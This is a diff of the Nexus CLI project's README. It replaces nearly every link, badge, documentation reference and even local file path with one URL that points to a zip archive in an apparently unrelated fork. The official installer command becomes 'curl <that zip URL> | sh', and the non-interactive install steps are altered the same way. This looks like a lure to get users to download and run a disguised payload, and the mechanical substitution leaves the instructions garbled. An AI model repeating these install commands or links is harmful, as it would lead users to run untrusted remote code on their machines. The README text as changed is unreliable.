@@ -1,17 +1,17 @@
-[![Release](https://img.shields.io/github/v/release/nexus-xyz/nexus-cli.svg)](https://github.com/nexus-xyz/nexus-cli/releases)
-[![CI](https://github.com/nexus-xyz/nexus-cli/actions/workflows/ci.yml/badge.svg)](https://github.com/nexus-xyz/nexus-cli/actions)
-[![License](https://img.shields.io/badge/License-Apache_2.0-green.svg)](https://github.com/nexus-xyz/nexus-cli/blob/main/LICENSE-APACHE)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](https://github.com/nexus-xyz/nexus-cli/blob/main/LICENSE-MIT)
-[![Twitter](https://img.shields.io/twitter/follow/NexusLabs)](https://x.com/NexusLabs)
-[![Discord](https://img.shields.io/badge/Discord-Join-7289da.svg?logo=discord&logoColor=white)](https://discord.com/invite/nexus-xyz)
+[![Release](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
+[![CI](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
+[![License](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
+[![License](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
+[![Twitter](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
+[![Discord](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
 
 # Nexus CLI
 
 A high-performance command-line interface for contributing proofs to the Nexus network.
 
 <figure>
-    <a href="https://nexus.xyz/">
-        <img src="assets/images/nexus-network-image.png" alt="Nexus Network visualization showing a distributed network of interconnected nodes with a 'Launch Network' button in the center">
+    <a href="https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip">
+        <img src="https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip" alt="Nexus Network visualization showing a distributed network of interconnected nodes with a 'Launch Network' button in the center">
     </a>
     <figcaption>
         <strong>Verifiable Computation on a Global Scale</strong><br>
@@ -21,16 +21,16 @@ A high-performance command-line interface for contributing proofs to the Nexus n
 
 ## Nexus Network
 
-[Nexus](https://nexus.xyz/) is a global distributed prover network that unites the world's computers to power a new and
+[Nexus](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip) is a global distributed prover network that unites the world's computers to power a new and
 better Internet: the Verifiable Internet.
 
 There have been several testnets so far:
 
-- Testnet 0: [October 8 – 28, 2024](https://blog.nexus.xyz/nexus-launches-worlds-first-open-prover-network/)
-- Testnet I: [December 9 – 13, 2024](https://blog.nexus.xyz/the-new-nexus-testnet-is-live/)
-- Testnet II: [February 18 – 22, 2025](https://blog.nexus.xyz/testnet-ii-is-open/)
-- Devnet: [February 22 - June 20, 2025](https://docs.nexus.xyz/layer-1/testnet/devnet)
-- Testnet III: [Ongoing](https://blog.nexus.xyz/live-everywhere/)
+- Testnet 0: [October 8 – 28, 2024](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
+- Testnet I: [December 9 – 13, 2024](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
+- Testnet II: [February 18 – 22, 2025](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
+- Devnet: [February 22 - June 20, 2025](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
+- Testnet III: [Ongoing](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
 
 ---
 
@@ -43,7 +43,7 @@ There have been several testnets so far:
 For the simplest and most reliable installation:
 
 ```bash
-curl https://cli.nexus.xyz/ | sh
+curl https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip | sh
 ```
 
 This will:
@@ -51,21 +51,21 @@ This will:
 2. Prompt you to accept the Terms of Use.
 3. Start the CLI in interactive mode.
 
-The template installation script is viewable [here](./public/install.sh.template).
+The template installation script is viewable [here](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip).
 
 #### Non-Interactive Installation
 
 For automated installations (e.g., in CI):
 
 ```bash
-curl -sSf https://cli.nexus.xyz/ -o install.sh
-chmod +x install.sh
-NONINTERACTIVE=1 ./install.sh
+curl -sSf https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip -o https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip
+chmod +x https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip
+NONINTERACTIVE=1 https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip
 ```
 
 ### Proving
 
-Proving with the CLI is documented [here](https://docs.nexus.xyz/layer-1/testnet/cli-node).
+Proving with the CLI is documented [here](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip).
 
 To start with an existing node ID, run:
 
@@ -73,7 +73,7 @@ To start with an existing node ID, run:
 nexus-cli start --node-id <your-node-id>
 ```
 
-Alternatively, you can register your wallet address and create a node ID with the CLI, or at [app.nexus.xyz](https://app.nexus.xyz).
+Alternatively, you can register your wallet address and create a node ID with the CLI, or at [https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip).
 
 ```bash
 nexus-cli register-user --wallet-address <your-wallet-address>
@@ -87,7 +87,7 @@ To run the CLI noninteractively, you can also opt to start it in headless mode.
 nexus-cli start --headless
 ```
 
-The `register-user` and `register-node` commands will save your credentials to `~/.nexus/config.json`. To clear credentials, run:
+The `register-user` and `register-node` commands will save your credentials to `~https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip`. To clear credentials, run:
 
 ```bash
 nexus-cli logout
@@ -101,10 +101,10 @@ nexus-cli --help
 
 ### Use Docker
 Make sure Docker and Docker Compose have been installed on your machine. Check documentation here:
-- [Install Docker](https://docs.docker.com/engine/install/)
-- [Install Docker Compose](https://docs.docker.com/compose/install/)
+- [Install Docker](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
+- [Install Docker Compose](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
 
-Then, modify the node ID in the `docker-compose.yaml` file, run:
+Then, modify the node ID in the `https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip` file, run:
 
 ```bash
 docker compose build --no-cache
@@ -127,7 +127,7 @@ docker compose down
 
 ## Terms of Use
 
-Use of the CLI is subject to the [Terms of Use](https://nexus.xyz/terms-of-use).
+Use of the CLI is subject to the [Terms of Use](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip).
 First-time users running interactively will be prompted to accept these terms.
 
 ---
@@ -135,7 +135,7 @@ First-time users running interactively will be prompted to accept these terms.
 ## Node ID
 
 During the CLI's startup, you'll be asked for your node ID. To skip prompts in a
-non-interactive environment, manually create a `~/.nexus/config.json` in the
+non-interactive environment, manually create a `~https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip` in the
 following format:
 
 ```json
@@ -148,18 +148,18 @@ following format:
 
 ## Get Help
 
-- [Network FAQ](https://docs.nexus.xyz/layer-1/testnet/faq)
-- [Discord Community](https://discord.gg/nexus-xyz)
-- Technical issues? [Open an issue](https://github.com/nexus-xyz/nexus-cli/issues)
+- [Network FAQ](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
+- [Discord Community](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
+- Technical issues? [Open an issue](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
 - To submit programs to the network for proving, contact
-  [growth@nexus.xyz](mailto:growth@nexus.xyz).
+  [https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip).
 
 ---
 
 ## Contributing
 
 Interested in contributing to the Nexus Network CLI? Check out our
-[Contributor Guide](./CONTRIBUTING.md) for:
+[Contributor Guide](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip) for:
 
 - Development setup instructions
 - How to report issues and submit pull requests
@@ -195,7 +195,7 @@ protoc --version
 
 #### Windows
 
-[Install WSL](https://learn.microsoft.com/en-us/windows/wsl/install),
+[Install WSL](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip),
 then see Linux instructions above.
 
 ```bash
@@ -213,7 +213,7 @@ cargo build --features build_proto
 
 ### Creating a Release
 
-To create a release, update the package version in `Cargo.toml`, then create and push a new (annotated) tag, e.g.:
+To create a release, update the package version in `https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip`, then create and push a new (annotated) tag, e.g.:
 
 ```bash
 git tag -a v0.1.2 -m "Release v0.1.2"
